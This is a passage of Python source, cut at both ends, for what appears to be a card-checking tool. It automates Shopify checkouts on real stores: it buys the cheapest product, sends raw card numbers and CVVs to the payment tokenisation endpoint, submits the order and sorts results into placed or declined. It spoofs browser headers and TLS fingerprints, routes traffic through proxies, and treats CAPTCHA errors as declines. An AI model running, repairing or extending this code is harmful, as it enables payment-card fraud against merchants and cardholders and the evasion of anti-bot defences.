        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""

def extract_checkout_total(proposal_body: str) -> str:
    match = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_total(proposal_body: str) -> str:
    match = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_running_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val  = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("runningTotal", {})
                    .get("value", {}))
        return val.get("amount", "")
    except Exception:
        return ""

def extract_seller_merchandise_price(proposal_body: str) -> str:
    match = re.search(
        r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""

def extract_seller_currency(proposal_body: str) -> str:
    match = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_country(proposal_body: str) -> str:
    match = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_tax_amount(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val  = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("tax", {})
                    .get("totalTaxAmount", {})
                    .get("value", {}))
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"

def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        return (seller.get("tax", {})
                      .get("totalTaxAmount", {})
                      .get("value", {})
                      .get("amount", "0.0"))
    except Exception:
        return "0.0"

def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
        return ""
    except Exception:
        return ""

def extract_receipt_id(submit_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return match.group(1) if match else ""

def extract_receipt_session_token(submit_body: str) -> str:
    match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""

def extract_payment_method_id(proposal_body: str) -> str:
    match = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"', proposal_body)
    return match.group(1) if match else ""

def extract_payment_gateways(proposal_body: str) -> list[dict]:
    try:
        seller = (json.loads(proposal_body)
                      .get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
    except Exception:
        return []

    lines = (seller.get("payment") or {}).get("availablePaymentLines") or []
    out: list[dict] = []
    seen: set[tuple] = set()

    for line in lines:
        pm = line.get("paymentMethod") or {}
        if not pm:
            continue
        entry = {
            "typename": pm.get("__typename", ""),
            "name": pm.get("name", ""),
            "display": pm.get("extensibilityDisplayName") or pm.get("displayName") or pm.get("name", ""),
            "id": pm.get("paymentMethodIdentifier", ""),
        }
        key = (entry["typename"], entry["name"], entry["id"])
        if key in seen:
            continue
        seen.add(key)
        out.append(entry)
    return out

def extract_receipt_url(poll_body: str, shop_url: str = "") -> str:
    try:
        poll_json   = json.loads(poll_body)
        receipt_obj = poll_json.get("data", {}).get("receipt", {})
        
        url = (receipt_obj.get("confirmationPage") or {}).get("url", "")
        if url and url.startswith("http"):
            return url
        
        url = receipt_obj.get("confirmationPageUrl", "")
        if url and url.startswith("http"):
            return url
        
        order = receipt_obj.get("order") or {}
        
        url = order.get("confirmationPageUrl", "")
        if url and url.startswith("http"):
            return url
        
        url = order.get("orderStatusPageUrl", "")
        if url and url.startswith("http"):
            return url
        url = order.get("orderStatusUrl", "")
        if url and url.startswith("http"):
            return url
        
        receipt_id = receipt_obj.get("id", "")
        if receipt_id and "gid://shopify/" in receipt_id:
            numeric_id = receipt_id.rstrip("/").split("/")[-1]
            if numeric_id.isdigit() and shop_url:
                return f"{shop_url.rstrip('/')}/orders/{numeric_id}"
        
        for pattern in [
            r'"confirmationPage"\s*:\s*\{[^}]*"url"\s*:\s*"(https?://[^"]+)"',
            r'"confirmationPageUrl"\s*:\s*"(https?://[^"]+)"',
            r'"orderStatusPageUrl"\s*:\s*"(https?://[^"]+)"',
            r'"orderStatusUrl"\s*:\s*"(https?://[^"]+)"',
            r'"thankYouUrl"\s*:\s*"(https?://[^"]+)"',
            r'"receiptUrl"\s*:\s*"(https?://[^"]+)"',
        ]:
            m = re.search(pattern, poll_body)
            if m:
                return m.group(1)
    
    except Exception:
        pass
    
    return ""

def extract_any_error(submit_body: str) -> str:
    for pattern in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        match = re.search(pattern, submit_body)
        if match:
            return match.group(1)
    return ""

def extract_submit_error(submit_body: str) -> str:
    match = re.search(r'"nonLocalizedMessage"\s*:\s*"([^"]+)"', submit_body)
    if match:
        return match.group(1)
    match = re.search(r'"code"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""

def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if match:
        code = match.group(1)
        if "CAPTCHA" in code:
            return "CARD_DECLINED"
        return code
    if "CAPTCHA" in poll_body:
        return "CARD_DECLINED"
    if receipt_type == "FailedReceipt":
        return "FAILED"
    return "UNKNOWN"

def detect_shipping_restriction(proposal_body: str) -> bool:
    restriction_signals = [
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "noDeliveryOptionsAvailable",
        "delivery is not available",
        "does not ship to",
    ]
    lower = proposal_body.lower()
    return any(s.lower() in lower for s in restriction_signals)


# ──────────────────────── Payload helpers ────────────────────────────

def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency != "USD":
        payload = payload.replace('"currencyCode": "USD"',        f'"currencyCode": "{currency}"')
        payload = payload.replace('"presentmentCurrency": "USD"', f'"presentmentCurrency": "{currency}"')
    if country != "US":
        payload = payload.replace(
            '"presentmentCurrency": "USD",\n      "countryCode": "US"',
            f'"presentmentCurrency": "USD",\n      "countryCode": "{country}"'
        )
        payload = payload.replace('"phoneCountryCode": "US"', f'"phoneCountryCode": "{country}"')
    return payload

def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"

def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"


# ──────────────────────── Step 9: PCI tokenisation ───────────────────

def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "") -> Tuple[int, str]:

    payload = json.dumps({
        "credit_card": {
            "number":             card_number,
            "month":              card_month,
            "year":               card_year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": shop_domain,
    })

    headers = {
        "accept":               "application/json",
        "accept-language":      "en-US,en;q=0.9",
        "content-type":         "application/json",
        "origin":               "https://checkout.pci.shopifyinc.com",
        "priority":             "u=1, i",
        "referer":              "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua":            '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":     "?0",
        "sec-ch-ua-platform":   '"Windows"',
        "sec-fetch-dest":       "empty",
        "sec-fetch-mode":       "cors",
        "sec-fetch-site":       "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }

    with Session(impersonate="chrome124") as session:
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
        resp = session.post("https://checkout.pci.shopifyinc.com/sessions",
                            data=payload, headers=headers, timeout=12)
    return resp.status_code, resp.text


# ──────────────────────── Proposal helpers ───────────────────────────

def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, build_id: str, source_token: str) -> Dict:
    return {
        "accept":                        "application/json",
        "accept-language":               "en-US",
        "content-type":                  "application/json",
        "origin":                        shop_url,
        "priority":                      "u=1, i",
        "referer":                       checkout_url,
        "sec-ch-ua":                     '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":              "?0",
        "sec-ch-ua-platform":            '"Windows"',
        "sec-fetch-dest":                "empty",
        "sec-fetch-mode":                "cors",
        "sec-fetch-site":                "same-origin",
        "shopify-checkout-client":       "checkout-web/1.0",
        "shopify-checkout-source":       f'id="{checkout_token}", type="cn"',
        "user-agent":                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
        "x-checkout-one-session-token":  session_token,
        "x-checkout-web-build-id":       build_id,
        "x-checkout-web-deploy-stage":   "production",
        "x-checkout-web-server-handling":"fast",
        "x-checkout-web-server-rendering":"yes",
        "x-checkout-web-source-id":      source_token,
    }


# ──────────────────────── Step 4: Proposal 1 ─────────────────────────

def send_proposal(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                  session_token: str, stable_id: str, variant_id: str, price: str,
                  proposal_id: str, build_id: str, source_token: str,
                  currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 5: Proposal 2 (email) ─────────────────

def send_proposal2(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 6: Proposal 3 (address) ───────────────

def send_proposal3(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, addr: Address, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 10: SubmitForCompletion ───────────────

def send_poll_for_receipt(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, build_id: str, source_token: str,
                          poll_id: str, receipt_id: str, receipt_session_token: str) -> Tuple[int, str]:

    params   = {
        "operationName": "PollForReceipt",
        "variables":     json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id":            poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"

    headers  = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token

    resp = client.get(full_url, headers=headers)
    return resp.status_code, resp.text


def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                               session_token: str, stable_id: str, variant_id: str, price: str,
                               submit_id: str, build_id: str, source_token: str, queue_token: str,
                               email: str, addr: Address, delivery_handle: str, shipping_amount: str,
                               total_amount: str, pci_session_id: str, attempt_token: str,
                               currency: str, country: str, signed_handles: List[str],
                               is_digital: bool = False,
                               item_amount: str = None,
                               tax_amount: str = None) -> Tuple[int, str]:

    handle_lines       = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id            = generate_page_id()

    if is_digital:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val   = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


# ──────────────────────── Error checking ─────────────────────────────

def check_proposal_errors(step: str, status: int, body: str):
    pass

def check_submit_errors(status: int, body: str):
    pass


# ──────────────────────── Orchestrator ───────────────────────────────

def run_check(client: TLSClient, shop_url: str, site_name: str,
              email: str, card_number: str, card_month: int, card_year: int, card_cvv: str,
              proxy_url: str = "", currency: str = "USD", country: str = "US") -> CheckResult:

    result          = CheckResult(card=card_number, status=CheckStatus.ERROR)
    result.shop_url  = shop_url
    result.site_name = site_name
    result.currency  = currency

    try:
        try:
            title, product_id, variant_id, price = find_cheapest_product(
                client, shop_url, MIN_PRODUCT_PRICE, MAX_PRODUCT_PRICE
            )
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result

        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id    = extract_stable_id(checkout_html)
            build_id     = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 1 failed: {e}")
            return result

        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result

        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("could not find actions JS URL")
            js_body     = fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id   = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result

        try:
            _, proposal_body = send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token, currency, country)

            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency

            if currency == "USD":
                seller_price = extract_seller_merchandise_price(proposal_body)
                if seller_price and seller_price != price:
                    price = seller_price

            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.error = Exception(f"Step 4 failed: {e}")
            return result

        try:
            _, proposal2_body = send_proposal2(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
